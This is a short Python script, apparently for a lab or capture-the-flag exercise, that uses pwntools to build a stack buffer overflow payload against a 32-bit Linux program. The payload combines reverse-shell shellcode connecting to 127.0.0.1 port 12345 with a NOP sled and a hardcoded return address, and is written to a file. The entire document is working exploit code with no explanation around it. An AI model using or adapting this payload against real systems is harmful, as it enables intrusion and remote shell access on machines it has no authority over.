from pwn import *
context.arch = 'i386'
context.os = 'linux'

# shellcode
s_code = shellcraft.i386.linux.connect('127.0.0.1', 12345) + shellcraft.i386.linux.dupsh('ebp')
s_code_asm = asm(s_code)

# return address
# r_addr - nop_len - addr_len
r_addr = 0xffffCC60 - len(s_code_asm) - 64 - 4
addr = p32(r_addr, endian='little')

nop = asm('nop', arch='i386')

payload =  b"2\n" + nop*(1557 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr

with open("./shellcode_payload_inj_revshell_32" , "wb") as f:
	f.write(payload)


